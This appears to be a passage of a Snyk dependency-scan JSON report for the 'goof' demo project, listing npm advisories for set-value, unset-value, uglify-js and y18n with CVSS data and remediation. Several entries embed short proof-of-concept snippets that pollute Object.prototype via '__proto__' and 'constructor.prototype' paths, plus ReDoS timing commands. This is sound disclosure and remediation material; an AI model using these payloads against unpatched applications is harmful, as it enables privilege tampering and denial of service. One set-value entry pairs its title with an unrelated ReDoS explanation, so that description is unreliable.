            "description": "## Overview\n[set-value](https://www.npmjs.com/package/set-value) is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the `path` parameter are arrays.\r\n\r\n\r\n### PoC\r\n```\r\nconst set = require(\"set-value\")\r\n\r\n// set({}, ['__proto__','polluted'], 'yes');\r\n// console.log(polluted); // Error: Cannot set unsafe key: \"__proto__\"\r\n\r\nset({}, [['__proto__'],'polluted'], 'yes');\r\nconsole.log(polluted);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `set-value` to version 4.0.1, 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452)\n- [GitHub PR](https://github.com/jonschlinkert/set-value/pull/33)\n- [Huntr Bounty Report](https://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/)\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\n",
            "disclosureTime": "2021-08-12T16:49:03Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "4.0.1",
              "2.0.1"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-SETVALUE-1540541",
            "identifiers": {
              "CVE": [
                "CVE-2021-23440"
              ],
              "CWE": [
                "CWE-1321"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-11-05T14:27:18.657314Z",
            "moduleName": "set-value",
            "packageManager": "npm",
            "packageName": "set-value",
            "patches": [],
            "proprietary": true,
            "publicationTime": "2021-09-12T12:24:31Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/jonschlinkert/set-value/pull/33"
              },
              {
                "title": "Huntr Bounty Report",
                "url": "https://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/"
              },
              {
                "title": "Snyk Blog",
                "url": "https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=3.0.0 <4.0.1",
                "<2.0.1"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "cache-base@1.0.1",
              "union-value@1.0.0",
              "set-value@0.4.3"
            ],
            "upgradePath": [],
            "isUpgradable": false,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "set-value",
            "version": "0.4.3",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "alternativeIds": [],
            "creationTime": "2019-06-20T09:40:41.272349Z",
            "credit": [
              "Jon Schlinkert"
            ],
            "cvssScore": 7.3,
            "description": "## Overview\n[set-value](https://www.npmjs.com/package/set-value) is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `set-value` could be tricked into adding or modifying properties of `Object.prototype` using any of the `constructor`, `prototype` and `_proto_` payloads.\r\n\r\n## PoC by Snyk\r\n```\r\nconst setFn = require('set-value');\r\nconst paths = [\r\n  'constructor.prototype.a0',\r\n  '__proto__.a1',\r\n];\r\n\r\nfunction check() {\r\n  for (const p of paths) {\r\n      setFn({}, p, true);\r\n  }\r\n  for (let i = 0; i < paths.length; i++) {\r\n      if (({})[`a${i}`] === true) {\r\n          console.log(`Yes with ${paths[i]}`);\r\n      }\r\n  }\r\n}\r\n\r\ncheck();\r\n\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `set-value` to version 2.0.1, 3.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f)\n- [NPM Security Advisory](https://nodesecurity.io/advisories/1012)\n",
            "disclosureTime": "2019-06-19T09:38:54Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "2.0.1",
              "3.0.1"
            ],
            "functions": [
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "create"
                },
                "version": [
                  "<0.3.0"
                ]
              },
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "module.exports"
                },
                "version": [
                  ">=0.3.0 <3.0.0"
                ]
              },
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "set"
                },
                "version": [
                  ">=3.0.0 <3.0.1"
                ]
              }
            ],
            "functions_new": [
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "create"
                },
                "version": [
                  "<0.3.0"
                ]
              },
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "module.exports"
                },
                "version": [
                  ">=0.3.0 <3.0.0"
                ]
              },
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "set"
                },
                "version": [
                  ">=3.0.0 <3.0.1"
                ]
              }
            ],
            "id": "SNYK-JS-SETVALUE-450213",
            "identifiers": {
              "CVE": [
                "CVE-2019-10747"
              ],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-4g88-fppr-53pp"
              ],
              "NSP": [
                "1012"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-12-22T17:02:13.120091Z",
            "moduleName": "set-value",
            "packageManager": "npm",
            "packageName": "set-value",
            "patches": [],
            "proprietary": true,
            "publicationTime": "2019-06-20T09:38:53Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f"
              },
              {
                "title": "NPM Security Advisory",
                "url": "https://nodesecurity.io/advisories/1012"
              }
            ],
            "semver": {
              "vulnerable": [
                "<2.0.1",
                ">=3.0.0 <3.0.1"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "cache-base@1.0.1",
              "union-value@1.0.0",
              "set-value@0.4.3"
            ],
            "upgradePath": [],
            "isUpgradable": false,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "set-value",
            "version": "0.4.3",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "alternativeIds": [],
            "creationTime": "2021-09-30T14:25:50.130236Z",
            "credit": [
              "ready-research"
            ],
            "cvssScore": 5.3,
            "description": "## Overview\n[uglify-js](http://npmjs.com/package/uglify-js) is a JavaScript parser, minifier, compressor and beautifier toolkit.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `string_template` and the `decode_template` functions.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `uglify-js` to version 3.14.3 or higher.\n## References\n- [GitHub Commit](https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b)\n- [GitHub Issue](https://github.com/mishoo/UglifyJS/issues/5133)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5134)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5135)\n",
            "disclosureTime": "2021-09-30T14:22:21Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "3.14.3"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-UGLIFYJS-1727251",
            "identifiers": {
              "CVE": [],
              "CWE": [
                "CWE-1333"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-11-09T18:42:15.332622Z",
            "moduleName": "uglify-js",
            "packageManager": "npm",
            "packageName": "uglify-js",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2021-11-09T18:42:15.313328Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b"
              },
              {
                "title": "GitHub Issue",
                "url": "https://github.com/mishoo/UglifyJS/issues/5133"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/mishoo/UglifyJS/pull/5134"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/mishoo/UglifyJS/pull/5135"
              }
            ],
            "semver": {
              "vulnerable": [
                "<3.14.3"
              ]
            },
            "severity": "medium",
            "socialTrendAlert": false,
            "title": "Regular Expression Denial of Service (ReDoS)",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.11",
              "uglify-js@2.8.29"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.12",
              "uglify-js@3.14.3"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "uglify-js",
            "version": "2.8.29",
            "severityWithCritical": "medium"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "alternativeIds": [],
            "creationTime": "2022-02-13T14:46:07.185334Z",
            "credit": [
              "khizar"
            ],
            "cvssScore": 7.5,
            "description": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `unset-value` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)\n- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)\n- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)\n- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)\n",
            "disclosureTime": "2022-02-13T14:44:04Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "2.0.1"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-UNSETVALUE-2400660",
            "identifiers": {
              "CVE": [],
              "CWE": [
                "CWE-1321"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2022-02-13T15:26:38.065734Z",
            "moduleName": "unset-value",
            "packageManager": "npm",
            "packageName": "unset-value",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2022-02-13T15:26:38.063549Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561"
              },
              {
                "title": "GitHub Issue",
                "url": "https://github.com/jonschlinkert/unset-value/issues/11"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/jonschlinkert/unset-value/pull/12"
              },
              {
                "title": "GitHub Release",
                "url": "https://github.com/jonschlinkert/unset-value/releases"
              }
            ],
            "semver": {
              "vulnerable": [
                "<2.0.1"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "cache-base@1.0.1",
              "unset-value@1.0.0"
            ],
            "upgradePath": [],
            "isUpgradable": false,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "unset-value",
            "version": "1.0.0",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
            "alternativeIds": [],
            "creationTime": "2020-10-25T14:27:16.715665Z",
            "credit": [
              "po6ix"
            ],
            "cvssScore": 7.3,
            "description": "## Overview\n[y18n](https://www.npmjs.com/package/y18n) is a the bare-bones internationalization library used by yargs\n\nAffected versions of this package are vulnerable to Prototype Pollution. PoC by po6ix:\r\n```\r\nconst y18n = require('y18n')();\r\n \r\ny18n.setLocale('__proto__');\r\ny18n.updateLocale({polluted: true});\r\n\r\nconsole.log(polluted); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `y18n` to version 3.2.2, 4.0.1, 5.0.5 or higher.\n## References\n- [GitHub Issue](https://github.com/yargs/y18n/issues/96)\n- [GitHub PR](https://github.com/yargs/y18n/pull/108)\n",
            "disclosureTime": "2020-10-25T14:24:22Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "3.2.2",
              "4.0.1",
              "5.0.5"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-Y18N-1021887",
            "identifiers": {
              "CVE": [
                "CVE-2020-7774"
              ],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-c4w7-xm78-47vh"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-05-02T13:23:15.353267Z",
            "moduleName": "y18n",
            "packageManager": "npm",
            "packageName": "y18n",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2020-11-10T15:27:28Z",
            "references": [
              {
                "title": "GitHub Issue",
                "url": "https://github.com/yargs/y18n/issues/96"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/yargs/y18n/pull/108"
              }
            ],
            "semver": {
              "vulnerable": [
                "<3.2.2",
                ">=4.0.0 <4.0.1",
                ">=5.0.0 <5.0.5"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "typeorm@0.2.24",
              "cli-highlight@2.1.4",
              "yargs@15.4.1",
              "y18n@4.0.0"
            ],
            "upgradePath": [
              false,
              "typeorm@0.2.24",
              "cli-highlight@2.1.4",
              "yargs@15.4.1",
              "y18n@4.0.1"
